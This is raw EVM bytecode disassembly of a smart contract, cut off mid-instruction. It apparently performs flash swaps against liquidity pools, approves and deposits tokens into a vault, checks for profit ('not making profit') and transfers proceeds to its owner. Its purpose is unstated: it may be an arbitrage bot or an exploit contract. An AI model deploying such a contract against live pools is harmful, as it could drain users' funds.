PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1EC SWAP2 SWAP1 PUSH2 0x13C6 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP2 AND SUB PUSH2 0x2AE JUMPI PUSH1 0x8 PUSH1 0x1 SLOAD PUSH1 0x7 DUP2 LT PUSH2 0x216 JUMPI PUSH2 0x216 PUSH2 0x1344 JUMP JUMPDEST ADD SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F PUSH1 0x0 PUSH2 0x233 PUSH1 0x1 DUP6 PUSH2 0x13EA JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 DUP2 DUP4 ADD MSTORE DUP2 MLOAD DUP1 DUP3 SUB DUP4 ADD DUP2 MSTORE PUSH1 0x60 DUP3 ADD SWAP3 DUP4 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP8 SWAP1 SHL AND SWAP1 SWAP3 MSTORE PUSH2 0x277 SWAP4 SWAP3 SWAP2 ADDRESS SWAP2 PUSH1 0x64 ADD PUSH2 0x144E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x357 JUMP JUMPDEST PUSH1 0x8 PUSH1 0x1 SLOAD PUSH1 0x7 DUP2 LT PUSH2 0x2C3 JUMPI PUSH2 0x2C3 PUSH2 0x1344 JUMP JUMPDEST ADD SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F PUSH2 0x2DE PUSH1 0x1 DUP6 PUSH2 0x13EA JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE SWAP2 DUP2 ADD DUP3 SWAP1 MSTORE ADDRESS SWAP1 PUSH1 0x60 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x324 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x144E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x33E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x352 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP POP PUSH2 0x3F0 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x63AD2C41 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x24 DUP3 ADD MSTORE PUSH11 0x2732CD04C6A4800A64A85 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x2 PUSH1 0x84 DUP3 ADD MSTORE PUSH2 0x60F PUSH1 0xF3 SHL PUSH1 0xA4 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x63AD2C41 SWAP1 PUSH1 0xC4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3D7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3EB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x0 DUP2 ISZERO PUSH2 0x421 JUMPI PUSH2 0x26F7 PUSH2 0x407 DUP7 PUSH2 0x2710 PUSH2 0x1485 JUMP JUMPDEST PUSH2 0x411 SWAP2 SWAP1 PUSH2 0x14A4 JUMP JUMPDEST PUSH2 0x41C SWAP1 PUSH1 0x1 PUSH2 0x132C JUMP JUMPDEST PUSH2 0x445 JUMP JUMPDEST PUSH2 0x26F7 PUSH2 0x430 DUP8 PUSH2 0x2710 PUSH2 0x1485 JUMP JUMPDEST PUSH2 0x43A SWAP2 SWAP1 PUSH2 0x14A4 JUMP JUMPDEST PUSH2 0x445 SWAP1 PUSH1 0x1 PUSH2 0x132C JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP DUP3 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x494 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x4B8 SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST LT ISZERO PUSH2 0x4FF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x1B9BDD081B585ADA5B99C81C1C9BDA599D PUSH1 0x7A SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP4 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x550 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x574 SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x5D8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x43616C6C6572206973206E6F7420746865206F776E6572000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x4F6 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x62F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x643 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x5 SLOAD PUSH1 0x2 SLOAD PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1C4009F9 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x24 DUP3 ADD MSTORE SWAP1 DUP3 AND PUSH1 0x44 DUP3 ADD MSTORE SWAP2 AND SWAP3 POP PUSH4 0x1C4009F9 SWAP2 POP PUSH1 0x64 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x6A9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6BD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 SWAP4 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 POP PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x70C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x730 SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x7 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE SWAP3 SWAP4 POP AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x787 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x7AB SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST POP PUSH1 0x7 SLOAD PUSH1 0x40 MLOAD PUSH4 0xB6B55F25 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0xB6B55F25 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x7F2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x806 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x8 DUP2 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x865 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x889 SWAP2 SWAP1 PUSH2 0x1376 JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0xD21220A7 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND SWAP7 POP SWAP3 SWAP1 SWAP4 AND SWAP4 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0xD21220A7 SWAP2 PUSH1 0x4 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x8E4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x908 SWAP2 SWAP1 PUSH2 0x13C6 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP2 AND SUB PUSH2 0x9B9 JUMPI PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F PUSH1 0x0 PUSH2 0x93B PUSH1 0x1 DUP6 PUSH2 0x13EA JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 SWAP2 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE ADDRESS SWAP1 PUSH1 0x60 ADD JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x983 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x144E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x99D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x9B1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F PUSH2 0x9D5 PUSH1 0x1 DUP6 PUSH2 0x13EA JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE SWAP2 DUP2 ADD DUP3 SWAP1 MSTORE ADDRESS SWAP1 PUSH1 0x60 ADD PUSH2 0x955 JUMP JUMPDEST PUSH2 0x9FA PUSH2 0xAEF JUMP JUMPDEST PUSH1 0x3 SLOAD PUSH1 0xF SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0xF77C4791 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xA9059CBB SWAP4 AND SWAP2 PUSH4 0xF77C4791 SWAP2 PUSH1 0x4 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA50 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA74 SWAP2 SWAP1 PUSH2 0x13C6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP5 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH11 0x273AD42557CCC5C6686CA PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xACB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9B1 SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 SWAP2 PUSH10 0x32D26D12E980B600000 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB48 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB6C SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH2 0xB76 SWAP2 SWAP1 PUSH2 0x13EA JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP3 SWAP4 POP AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xBC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xBDD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x5 SLOAD PUSH1 0x2 SLOAD PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1C4009F9 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH10 0x32D26D12E980B600000 PUSH1 0x24 DUP3 ADD MSTORE SWAP1 DUP3 AND PUSH1 0x44 DUP3 ADD MSTORE SWAP2 AND SWAP3 POP PUSH4 0x1C4009F9 SWAP2 POP PUSH1 0x64 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xC45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xC59 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x6 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP3 POP PUSH4 0xA9059CBB SWAP2 POP DUP3 SWAP1 DUP2 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xCAF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xCD3 SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD1E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD42 SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST POP PUSH1 0x0 DUP1 PUSH1 0x10 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xD99 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDBD SWAP2 SWAP1 PUSH2 0x1376 JUMP JUMPDEST POP PUSH1 0x12 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1535435 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP8 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP3 DUP4 AND PUSH1 0x24 DUP3 ADD DUP2 SWAP1 MSTORE SWAP4 SWAP1 SWAP3 AND PUSH1 0x44 DUP4 ADD DUP2 SWAP1 MSTORE SWAP5 POP SWAP2 SWAP3 POP DUP5 SWAP2 PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x54D50D4 SWAP1 PUSH1 0x64 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xE52 SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x10 SLOAD PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP7 SWAP1 MSTORE SWAP3 SWAP4 POP AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEA9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 